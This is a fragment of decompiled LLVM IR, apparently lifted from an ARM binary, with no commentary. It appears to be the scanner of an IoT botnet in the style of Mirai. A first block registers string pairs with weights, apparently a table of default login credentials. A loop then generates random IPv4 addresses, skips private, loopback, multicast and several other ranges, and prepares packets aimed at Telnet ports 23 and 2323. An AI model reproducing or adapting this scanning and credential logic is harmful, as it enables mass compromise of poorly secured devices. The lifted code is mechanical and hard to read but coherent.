  %v4_104dc = call i32 @function_fe88(i32 ptrtoint ([6 x i8]* @global_var_198b4.225 to i32), i32 ptrtoint (i32* @global_var_199a8.281 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_198b4.225 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_199b8.283 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v4_104ec = call i32 @function_fe88(i32 ptrtoint ([6 x i8]* @global_var_198b4.225 to i32), i32 ptrtoint (i32* @global_var_199b8.283 to i32), i32 8)
  store i32 ptrtoint ([6 x i8]* @global_var_198b4.225 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_199c4.285 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_104fc = call i32 @function_fe88(i32 ptrtoint ([6 x i8]* @global_var_198b4.225 to i32), i32 ptrtoint ([5 x i8]* @global_var_199c4.285 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_198b4.225 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_198e0.287 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v5_1050c = call i32 @function_fe88(i32 ptrtoint ([6 x i8]* @global_var_198b4.225 to i32), i32 ptrtoint ([5 x i8]* @global_var_198e0.287 to i32), i32 5)
  store i32 ptrtoint ([6 x i8]* @global_var_198b4.225 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_199cc.289 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v4_1051c = call i32 @function_fe88(i32 ptrtoint ([6 x i8]* @global_var_198b4.225 to i32), i32 ptrtoint (i32* @global_var_199cc.289 to i32), i32 8)
  store i32 ptrtoint ([6 x i8]* @global_var_198b4.225 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_199d8.291 to i32), i32* %r1.global-to-local, align 4
  %v0_10528 = load i32, i32* @r4, align 4
  store i32 %v0_10528, i32* %r2.global-to-local, align 4
  %v4_1052c = call i32 @function_fe88(i32 ptrtoint ([6 x i8]* @global_var_198b4.225 to i32), i32 ptrtoint (i32* @global_var_199d8.291 to i32), i32 %v0_10528)
  store i32 ptrtoint ([5 x i8]* @global_var_198ac.221 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_199e0.293 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_1053c = call i32 @function_fe88(i32 ptrtoint ([5 x i8]* @global_var_198ac.221 to i32), i32 ptrtoint (i32* @global_var_199e0.293 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_198ac.221 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_199e4.295 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v4_1054c = call i32 @function_fe88(i32 ptrtoint ([5 x i8]* @global_var_198ac.221 to i32), i32 ptrtoint (i32* @global_var_199e4.295 to i32), i32 7)
  store i32 ptrtoint ([4 x i8]* @global_var_199ec.297 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_197e8.223 to i32), i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v4_1055c = call i32 @function_fe88(i32 ptrtoint ([4 x i8]* @global_var_199ec.297 to i32), i32 ptrtoint (i32* @global_var_197e8.223 to i32), i32 3)
  store i32 ptrtoint ([5 x i8]* @global_var_198ac.221 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_199f0.299 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v4_1056c = call i32 @function_fe88(i32 ptrtoint ([5 x i8]* @global_var_198ac.221 to i32), i32 ptrtoint (i32* @global_var_199f0.299 to i32), i32 10)
  store i32 ptrtoint ([6 x i8]* @global_var_198b4.225 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_199fc.301 to i32), i32* %r1.global-to-local, align 4
  %v0_10578 = load i32, i32* @r4, align 4
  store i32 %v0_10578, i32* %r2.global-to-local, align 4
  %v5_1057c = call i32 @function_fe88(i32 ptrtoint ([6 x i8]* @global_var_198b4.225 to i32), i32 ptrtoint ([7 x i8]* @global_var_199fc.301 to i32), i32 %v0_10578)
  store i32 ptrtoint ([7 x i8]* @global_var_19a04.303 to i32), i32* %r0.global-to-local, align 4
  %v0_10584 = load i32, i32* @r4, align 4
  store i32 %v0_10584, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_19a04.303 to i32), i32* %r1.global-to-local, align 4
  %v5_1058c = call i32 @function_fe88(i32 ptrtoint ([7 x i8]* @global_var_19a04.303 to i32), i32 ptrtoint ([7 x i8]* @global_var_19a04.303 to i32), i32 %v0_10584)
  store i32 ptrtoint ([6 x i8]* @global_var_198b4.225 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_19a0c.305 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v4_1059c = call i32 @function_fe88(i32 ptrtoint ([6 x i8]* @global_var_198b4.225 to i32), i32 ptrtoint (i32* @global_var_19a0c.305 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_198ac.221 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_19a0c.305 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v4_105ac = call i32 @function_fe88(i32 ptrtoint ([5 x i8]* @global_var_198ac.221 to i32), i32 ptrtoint (i32* @global_var_19a0c.305 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_198ac.221 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_19a18.307 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v4_105bc = call i32 @function_fe88(i32 ptrtoint ([5 x i8]* @global_var_198ac.221 to i32), i32 ptrtoint (i32* @global_var_19a18.307 to i32), i32 8)
  store i32 ptrtoint ([7 x i8]* @global_var_19a24.309 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_197e8.223 to i32), i32* %r1.global-to-local, align 4
  %v0_105c8 = load i32, i32* @r4, align 4
  store i32 %v0_105c8, i32* %r2.global-to-local, align 4
  %v4_105cc = call i32 @function_fe88(i32 ptrtoint ([7 x i8]* @global_var_19a24.309 to i32), i32 ptrtoint (i32* @global_var_197e8.223 to i32), i32 %v0_105c8)
  %v0_105d0 = load i32, i32* @r4, align 4
  store i32 %v0_105d0, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_19a2c.311 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_19a34.313 to i32), i32* %r1.global-to-local, align 4
  %v4_105dc = call i32 @function_fe88(i32 ptrtoint (i32* @global_var_19a2c.311 to i32), i32 ptrtoint ([7 x i8]* @global_var_19a34.313 to i32), i32 %v0_105d0)
  store i32 ptrtoint ([9 x i8]* @global_var_19a3c.315 to i32), i32* %r0.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_19a3c.315 to i32), i32* %r1.global-to-local, align 4
  %v5_105ec = call i32 @function_fe88(i32 ptrtoint ([9 x i8]* @global_var_19a3c.315 to i32), i32 ptrtoint ([9 x i8]* @global_var_19a3c.315 to i32), i32 8)
  store i32 ptrtoint ([9 x i8]* @global_var_19a48.317 to i32), i32* %r0.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_19a48.317 to i32), i32* %r1.global-to-local, align 4
  %v5_105fc = call i32 @function_fe88(i32 ptrtoint ([9 x i8]* @global_var_19a48.317 to i32), i32 ptrtoint ([9 x i8]* @global_var_19a48.317 to i32), i32 8)
  store i32 %v5_105fc, i32* %r0.global-to-local, align 4
  %v2_10604 = ptrtoint i32* %stack_var_-1866 to i32
  br label %dec_label_pc_1060c

dec_label_pc_1060c:                               ; preds = %dec_label_pc_10d7c, %dec_label_pc_10148
  %stack_var_-1876.0 = phi i32 [ %tmp273, %dec_label_pc_10148 ], [ %stack_var_-1876.2, %dec_label_pc_10d7c ]
  %stack_var_-1884.0 = phi i32 [ %v2_10604, %dec_label_pc_10148 ], [ %stack_var_-1884.1, %dec_label_pc_10d7c ]
  %stack_var_-1880.0 = phi i16 [ %v4_10134, %dec_label_pc_10148 ], [ %stack_var_-1880.1, %dec_label_pc_10d7c ]
  store i32 ptrtoint (i32* @global_var_223e8.194 to i32), i32* %r0.global-to-local, align 4
  store i32 %stack_var_-1876.0, i32* %r1.global-to-local, align 4
  %v2_10614 = load i32, i32* @global_var_223e8.194, align 4
  store i32 %v2_10614, i32* @r5, align 4
  %v3_10618 = icmp uge i32 %stack_var_-1876.0, %v2_10614
  store i1 %v3_10618, i1* %cpsr_c.global-to-local, align 1
  %v9_10618 = icmp eq i32 %stack_var_-1876.0, %v2_10614
  store i1 %v9_10618, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_10618, label %dec_label_pc_10898, label %dec_label_pc_10620

dec_label_pc_10620:                               ; preds = %dec_label_pc_1060c
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_10624 = ptrtoint i32* %stack_var_-104 to i32
  store i32 0, i32* %stack_var_-52, align 4
  br label %dec_label_pc_10630

dec_label_pc_10630:                               ; preds = %dec_label_pc_107f4, %dec_label_pc_10620
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-96, align 4
  %v0_10644 = call i32 @function_f570()
  %v1_10644 = trunc i32 %v0_10644 to i16
  store i32 %v0_10644, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2295c.90 to i32), i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i8** @global_var_223b8.209 to i32), i32* %ip.global-to-local, align 4
  %v2_10650 = load i32, i32* @global_var_2295c.90, align 4
  store i32 %v2_10650, i32* %r3.global-to-local, align 4
  store i16 %v1_10644, i16* bitcast (i32* @global_var_223bc.211 to i16*), align 4
  store i32 %v2_10650, i32* @global_var_223c4.318, align 4
  br label %dec_label_pc_1065c

dec_label_pc_1065c:                               ; preds = %dec_label_pc_10730, %dec_label_pc_1068c, %dec_label_pc_10764, %dec_label_pc_10758, %dec_label_pc_1074c, %dec_label_pc_10740, %.thread29, %bb329, %bb328, %bb327, %bb326, %bb325, %dec_label_pc_10728, %dec_label_pc_10720, %bb321, %dec_label_pc_106f0, %dec_label_pc_106cc, %bb314, %dec_label_pc_1069c, %bb313, %dec_label_pc_10684, %bb312, %bb331, %dec_label_pc_10630
  %v0_1065c = call i32 @function_f570()
  store i32 %v0_1065c, i32* %r0.global-to-local, align 4
  %v1_10660 = urem i32 %v0_1065c, 256
  store i32 %v1_10660, i32* %r1.global-to-local, align 4
  %v3_10664 = udiv i32 %v0_1065c, 256
  store i32 %v3_10664, i32* %r3.global-to-local, align 4
  %v3_10668 = udiv i32 %v0_1065c, 65536
  store i32 %v3_10668, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1066c = icmp eq i32 %v1_10660, 0
  store i1 %v2_1066c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1066c, label %bb312, label %bb311

bb311:                                            ; preds = %dec_label_pc_1065c
  %v3_10670 = icmp ugt i32 %v1_10660, 126
  store i1 %v3_10670, i1* %cpsr_c.global-to-local, align 1
  %v8_10670 = icmp eq i32 %v1_10660, 127
  store i1 %v8_10670, i1* %cpsr_z.global-to-local, align 1
  br label %bb312

bb312:                                            ; preds = %dec_label_pc_1065c, %bb311
  %v0_10680 = phi i1 [ true, %dec_label_pc_1065c ], [ %v8_10670, %bb311 ]
  %v1_10674 = urem i32 %v3_10664, 256
  store i32 %v1_10674, i32* %ip.global-to-local, align 4
  %v1_10678 = urem i32 %v3_10668, 256
  store i32 %v1_10678, i32* %r2.global-to-local, align 4
  %v1_1067c = and i32 %v0_1065c, 8388608
  %v2_1067c = icmp ne i32 %v1_1067c, 0
  store i1 %v2_1067c, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_10680, label %dec_label_pc_1065c, label %dec_label_pc_10684

dec_label_pc_10684:                               ; preds = %bb312
  %v2_10684 = icmp ugt i32 %v1_10660, 2
  store i1 %v2_10684, i1* %cpsr_c.global-to-local, align 1
  %v7_10684 = icmp eq i32 %v1_10660, 3
  store i1 %v7_10684, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10684, label %dec_label_pc_1065c, label %dec_label_pc_1068c

dec_label_pc_1068c:                               ; preds = %dec_label_pc_10684
  %v1_1068c = add nsw i32 %v1_10660, -15
  store i32 %v1_1068c, i32* %r3.global-to-local, align 4
  %v2_10690 = icmp ugt i32 %v1_10660, 55
  store i1 %v2_10690, i1* %cpsr_c.global-to-local, align 1
  %v7_10690 = icmp eq i32 %v1_10660, 56
  store i1 %v7_10690, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10690, label %dec_label_pc_1065c, label %bb313

bb313:                                            ; preds = %dec_label_pc_1068c
  %v3_10694 = icmp ne i32 %v1_1068c, 0
  store i1 %v3_10694, i1* %cpsr_c.global-to-local, align 1
  %v8_10694 = icmp eq i32 %v1_1068c, 1
  store i1 %v8_10694, i1* %cpsr_z.global-to-local, align 1
  %v2_10698 = xor i1 %v3_10694, true
  %v3_10698 = or i1 %v8_10694, %v2_10698
  br i1 %v3_10698, label %dec_label_pc_1065c, label %dec_label_pc_1069c

dec_label_pc_1069c:                               ; preds = %bb313
  %v2_1069c = icmp ugt i32 %v1_10660, 9
  store i1 %v2_1069c, i1* %cpsr_c.global-to-local, align 1
  %v7_1069c = icmp eq i32 %v1_10660, 10
  store i1 %v7_1069c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1069c, label %dec_label_pc_1065c, label %dec_label_pc_106a4

dec_label_pc_106a4:                               ; preds = %dec_label_pc_1069c
  %v2_106a4 = icmp ugt i32 %v1_10660, 191
  store i1 %v2_106a4, i1* %cpsr_c.global-to-local, align 1
  %v7_106a4 = icmp eq i32 %v1_10660, 192
  store i1 %v7_106a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_106a4, label %bb314, label %dec_label_pc_106b0

bb314:                                            ; preds = %dec_label_pc_106a4
  %v3_106a8 = icmp ugt i32 %v1_10674, 167
  store i1 %v3_106a8, i1* %cpsr_c.global-to-local, align 1
  %v8_106a8 = icmp eq i32 %v1_10674, 168
  store i1 %v8_106a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_106a8, label %dec_label_pc_1065c, label %dec_label_pc_106b0

dec_label_pc_106b0:                               ; preds = %dec_label_pc_106a4, %bb314
  %v7_106b0 = icmp eq i32 %v1_10660, 172
  %.384 = zext i1 %v7_106b0 to i32
  store i32 %.384, i32* %r3.global-to-local, align 4
  %v2_106bc = icmp ugt i32 %v1_10674, 14
  store i1 %v2_106bc, i1* %cpsr_c.global-to-local, align 1
  %v7_106bc = icmp eq i32 %v1_10674, 15
  store i1 %v7_106bc, i1* %cpsr_z.global-to-local, align 1
  %v2_106c0 = xor i1 %v2_106bc, true
  %v3_106c0 = or i1 %v7_106bc, %v2_106c0
  br i1 %v3_106c0, label %.thread7, label %bb317

.thread7:                                         ; preds = %dec_label_pc_106b0
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_106d4

bb317:                                            ; preds = %dec_label_pc_106b0
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_106c4 = icmp eq i1 %v7_106b0, false
  store i1 %v2_106c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_106c4, label %dec_label_pc_106d4, label %dec_label_pc_106cc

dec_label_pc_106cc:                               ; preds = %bb317
  %v2_106cc = icmp ugt i32 %v1_10674, 30
  store i1 %v2_106cc, i1* %cpsr_c.global-to-local, align 1
  %v7_106cc = icmp eq i32 %v1_10674, 31
  store i1 %v7_106cc, i1* %cpsr_z.global-to-local, align 1
  %v2_106d0 = xor i1 %v2_106cc, true
  %v3_106d0 = or i1 %v7_106cc, %v2_106d0
  br i1 %v3_106d0, label %dec_label_pc_1065c, label %dec_label_pc_106d4

dec_label_pc_106d4:                               ; preds = %.thread7, %dec_label_pc_106cc, %bb317
  %v7_106d4 = icmp eq i32 %v1_10660, 100
  %.385 = zext i1 %v7_106d4 to i32
  store i32 %.385, i32* %r3.global-to-local, align 4
  %v2_106e0 = icmp ugt i32 %v1_10674, 62
  store i1 %v2_106e0, i1* %cpsr_c.global-to-local, align 1
  %v7_106e0 = icmp eq i32 %v1_10674, 63
  store i1 %v7_106e0, i1* %cpsr_z.global-to-local, align 1
  %v2_106e4 = xor i1 %v2_106e0, true
  %v3_106e4 = or i1 %v7_106e0, %v2_106e4
  br i1 %v3_106e4, label %.thread12, label %bb320

.thread12:                                        ; preds = %dec_label_pc_106d4
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_106f8

bb320:                                            ; preds = %dec_label_pc_106d4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_106e8 = icmp eq i1 %v7_106d4, false
  store i1 %v2_106e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_106e8, label %dec_label_pc_106f8, label %dec_label_pc_106f0

dec_label_pc_106f0:                               ; preds = %bb320
  %v2_106f0 = icmp ugt i32 %v1_10674, 125
  store i1 %v2_106f0, i1* %cpsr_c.global-to-local, align 1
  %v7_106f0 = icmp eq i32 %v1_10674, 126
  store i1 %v7_106f0, i1* %cpsr_z.global-to-local, align 1
  %v2_106f4 = xor i1 %v2_106f0, true
  %v3_106f4 = or i1 %v7_106f0, %v2_106f4
  br i1 %v3_106f4, label %dec_label_pc_1065c, label %dec_label_pc_106f8

dec_label_pc_106f8:                               ; preds = %.thread12, %dec_label_pc_106f0, %bb320
  %v2_106f8 = icmp ugt i32 %v1_10660, 168
  store i1 %v2_106f8, i1* %cpsr_c.global-to-local, align 1
  %v7_106f8 = icmp eq i32 %v1_10660, 169
  store i1 %v7_106f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_106f8, label %bb321, label %dec_label_pc_10704

bb321:                                            ; preds = %dec_label_pc_106f8
  %v3_106fc = icmp eq i32 %v1_10674, 255
  store i1 %v3_106fc, i1* %cpsr_c.global-to-local, align 1
  store i1 %v3_106fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_106fc, label %dec_label_pc_1065c, label %dec_label_pc_10704

dec_label_pc_10704:                               ; preds = %dec_label_pc_106f8, %bb321
  %v7_10704 = icmp eq i32 %v1_10660, 198
  %.386 = zext i1 %v7_10704 to i32
  store i32 %.386, i32* %r3.global-to-local, align 4
  %v2_10710 = icmp ugt i32 %v1_10674, 16
  store i1 %v2_10710, i1* %cpsr_c.global-to-local, align 1
  %v7_10710 = icmp eq i32 %v1_10674, 17
  store i1 %v7_10710, i1* %cpsr_z.global-to-local, align 1
  %v2_10714 = xor i1 %v2_10710, true
  %v3_10714 = or i1 %v7_10710, %v2_10714
  br i1 %v3_10714, label %.thread18, label %bb324

.thread18:                                        ; preds = %dec_label_pc_10704
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10728

bb324:                                            ; preds = %dec_label_pc_10704
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10718 = icmp eq i1 %v7_10704, false
  store i1 %v2_10718, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10718, label %dec_label_pc_10728, label %dec_label_pc_10720

dec_label_pc_10720:                               ; preds = %bb324
  %v2_10720 = icmp ugt i32 %v1_10674, 18
  store i1 %v2_10720, i1* %cpsr_c.global-to-local, align 1
  %v7_10720 = icmp eq i32 %v1_10674, 19
  store i1 %v7_10720, i1* %cpsr_z.global-to-local, align 1
  %v2_10724 = xor i1 %v2_10720, true
  %v3_10724 = or i1 %v7_10720, %v2_10724
  br i1 %v3_10724, label %dec_label_pc_1065c, label %dec_label_pc_10728

dec_label_pc_10728:                               ; preds = %.thread18, %dec_label_pc_10720, %bb324
  %v2_10728 = icmp ugt i32 %v1_10660, 222
  store i1 %v2_10728, i1* %cpsr_c.global-to-local, align 1
  %v7_10728 = icmp eq i32 %v1_10660, 223
  store i1 %v7_10728, i1* %cpsr_z.global-to-local, align 1
  %v2_1072c = xor i1 %v7_10728, true
  %v3_1072c = and i1 %v2_10728, %v2_1072c
  br i1 %v3_1072c, label %dec_label_pc_1065c, label %dec_label_pc_10730

dec_label_pc_10730:                               ; preds = %dec_label_pc_10728
  %v1_10730 = add nsw i32 %v1_10660, -6
  store i32 %v1_10730, i32* %r3.global-to-local, align 4
  %v2_10734 = icmp ugt i32 %v1_10660, 10
  store i1 %v2_10734, i1* %cpsr_c.global-to-local, align 1
  %v7_10734 = icmp eq i32 %v1_10660, 11
  store i1 %v7_10734, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10734, label %dec_label_pc_1065c, label %bb325

bb325:                                            ; preds = %dec_label_pc_10730
  %v3_10738 = icmp ne i32 %v1_10730, 0
  store i1 %v3_10738, i1* %cpsr_c.global-to-local, align 1
  %v8_10738 = icmp eq i32 %v1_10730, 1
  store i1 %v8_10738, i1* %cpsr_z.global-to-local, align 1
  %v2_1073c = xor i1 %v3_10738, true
  %v3_1073c = or i1 %v8_10738, %v2_1073c
  br i1 %v3_1073c, label %dec_label_pc_1065c, label %dec_label_pc_10740

dec_label_pc_10740:                               ; preds = %bb325
  %v2_10740 = icmp ugt i32 %v1_10660, 21
  store i1 %v2_10740, i1* %cpsr_c.global-to-local, align 1
  %v7_10740 = icmp eq i32 %v1_10660, 22
  store i1 %v7_10740, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10740, label %dec_label_pc_1065c, label %bb326

bb326:                                            ; preds = %dec_label_pc_10740
  %v3_10744 = icmp ugt i32 %v1_10660, 20
  store i1 %v3_10744, i1* %cpsr_c.global-to-local, align 1
  %v8_10744 = icmp eq i32 %v1_10660, 21
  store i1 %v8_10744, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10744, label %dec_label_pc_1065c, label %dec_label_pc_1074c

dec_label_pc_1074c:                               ; preds = %bb326
  %v2_1074c = icmp ugt i32 %v1_10660, 27
  store i1 %v2_1074c, i1* %cpsr_c.global-to-local, align 1
  %v7_1074c = icmp eq i32 %v1_10660, 28
  store i1 %v7_1074c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1074c, label %dec_label_pc_1065c, label %bb327

bb327:                                            ; preds = %dec_label_pc_1074c
  %v3_10750 = icmp ugt i32 %v1_10660, 25
  store i1 %v3_10750, i1* %cpsr_c.global-to-local, align 1
  %v8_10750 = icmp eq i32 %v1_10660, 26
  store i1 %v8_10750, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10750, label %dec_label_pc_1065c, label %dec_label_pc_10758

dec_label_pc_10758:                               ; preds = %bb327
  %v2_10758 = icmp ugt i32 %v1_10660, 29
  store i1 %v2_10758, i1* %cpsr_c.global-to-local, align 1
  %v7_10758 = icmp eq i32 %v1_10660, 30
  store i1 %v7_10758, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10758, label %dec_label_pc_1065c, label %bb328

bb328:                                            ; preds = %dec_label_pc_10758
  %v3_1075c = icmp ugt i32 %v1_10660, 28
  store i1 %v3_1075c, i1* %cpsr_c.global-to-local, align 1
  %v8_1075c = icmp eq i32 %v1_10660, 29
  store i1 %v8_1075c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_1075c, label %dec_label_pc_1065c, label %dec_label_pc_10764

dec_label_pc_10764:                               ; preds = %bb328
  %v2_10764 = icmp ugt i32 %v1_10660, 54
  store i1 %v2_10764, i1* %cpsr_c.global-to-local, align 1
  %v7_10764 = icmp eq i32 %v1_10660, 55
  store i1 %v7_10764, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10764, label %dec_label_pc_1065c, label %bb329

bb329:                                            ; preds = %dec_label_pc_10764
  %v3_10768 = icmp ugt i32 %v1_10660, 32
  store i1 %v3_10768, i1* %cpsr_c.global-to-local, align 1
  %v8_10768 = icmp eq i32 %v1_10660, 33
  store i1 %v8_10768, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10768, label %dec_label_pc_1065c, label %dec_label_pc_10770

dec_label_pc_10770:                               ; preds = %bb329
  %v2_10770 = icmp ugt i32 %v1_10660, 214
  store i1 %v2_10770, i1* %cpsr_c.global-to-local, align 1
  %v7_10770 = icmp eq i32 %v1_10660, 215
  store i1 %v7_10770, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10770, label %.thread29, label %bb330

bb330:                                            ; preds = %dec_label_pc_10770
  %v3_10774 = icmp ugt i32 %v1_10660, 213
  store i1 %v3_10774, i1* %cpsr_c.global-to-local, align 1
  %v8_10774 = icmp eq i32 %v1_10660, 214
  store i1 %v8_10774, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10774, label %bb331, label %dec_label_pc_10784

.thread29:                                        ; preds = %dec_label_pc_10770
  br label %dec_label_pc_1065c

bb331:                                            ; preds = %bb330
  br label %dec_label_pc_1065c

dec_label_pc_10784:                               ; preds = %bb330
  store i32 0, i32* @r4, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v5_10790 = call i32 @llvm.bswap.i32(i32 %v0_1065c)
  store i32 %v5_10790, i32* %r0.global-to-local, align 4
  %v1_10794 = call i32 @function_14874(i32 %v5_10790)
  store i32 20, i32* %r1.global-to-local, align 4
  store i32 %v1_10794, i32* @global_var_223c8.319, align 4
  %v0_107a4 = load i32, i32* @r4, align 4
  %v1_107a4 = trunc i32 %v0_107a4 to i16
  store i16 %v1_107a4, i16* bitcast (i32* @global_var_223c2.320 to i16*), align 4
  store i32 ptrtoint (i8** @global_var_223b8.209 to i32), i32* @r0, align 4
  %v3_107ac = call i32 @function_dadc(i32 ptrtoint (i8** @global_var_223b8.209 to i32), i32 20)
  %v4_107ac = trunc i32 %v3_107ac to i16
  store i32 %v3_107ac, i32* %r0.global-to-local, align 4
  %v3_107b0 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_107b0, i32* %r1.global-to-local, align 4
  %v5_107c0 = sdiv i32 %v3_107b0, 10
  %v3_107c4 = mul i32 %v5_107c0, 8
  store i32 %v3_107c4, i32* %r2.global-to-local, align 4
  %v2_107cc = mul i32 %v5_107c0, 10
  store i32 %v2_107cc, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i8** @global_var_223b8.209 to i32), i32* %ip.global-to-local, align 4
  %v3_107d4 = icmp uge i32 %v3_107b0, %v2_107cc
  store i1 %v3_107d4, i1* %cpsr_c.global-to-local, align 1
  %v9_107d4 = icmp eq i32 %v3_107b0, %v2_107cc
  store i1 %v9_107d4, i1* %cpsr_z.global-to-local, align 1
  store i16 %v4_107ac, i16* bitcast (i32* @global_var_223c2.320 to i16*), align 4
  br i1 %v9_107d4, label %dec_label_pc_107e0, label %dec_label_pc_10b8c

dec_label_pc_107e0:                               ; preds = %dec_label_pc_10784
  store i32 2323, i32* %r0.global-to-local, align 4
  %v1_107e8 = call i32 @function_14898(i32 2323)
  %v2_107e8 = trunc i32 %v1_107e8 to i16
  store i32 %v1_107e8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_107f4

dec_label_pc_107f4:                               ; preds = %dec_label_pc_10b8c, %dec_label_pc_107e0
  %storemerge = phi i16 [ %v2_107e8, %dec_label_pc_107e0 ], [ %v2_10b90, %dec_label_pc_10b8c ]
  store i16 %storemerge, i16* @global_var_223ce.217, align 2
  store i32 ptrtoint (i8** @global_var_223b8.209 to i32), i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_223cc.215 to i32), i32* %ip.global-to-local, align 4
  %v3_107fc = load i32, i32* @global_var_223c8.319, align 4
  store i32 %v3_107fc, i32* %r3.global-to-local, align 4
  store i32 %v3_107fc, i32* @global_var_223d0.322, align 4
  store i16 0, i16* bitcast (i32* @global_var_223dc.323 to i16*), align 4
  store i32 20, i32* %r0.global-to-local, align 4
  %v1_10810 = call i32 @function_14898(i32 20)
  store i32 %v1_10810, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i8** @global_var_223b8.209 to i32), i32* %r0.global-to-local, align 4
  store i32 20, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_223cc.215 to i32), i32* @r1, align 4
  %v5_10824 = call i32 @function_db2c(i32 ptrtoint (i8** @global_var_223b8.209 to i32), i32 ptrtoint (i32* @global_var_223cc.215 to i32), i32 %v1_10810, i32 20)
  %v6_10824 = trunc i32 %v5_10824 to i16
  store i16 %v6_10824, i16* bitcast (i32* @global_var_223dc.323 to i16*), align 4
  %v2_10840 = load i32, i32* @global_var_2297c.207, align 4
  store i32 2, i32* %stack_var_-96, align 4
  %v3_1085c = load i16, i16* @global_var_223ce.217, align 2
  %v4_1085c = zext i16 %v3_1085c to i32
  store i32 %v4_1085c, i32* %ip.global-to-local, align 4
  store i32 %v2_10624, i32* @lr, align 4
  store i32 %v2_10840, i32* @r0, align 4
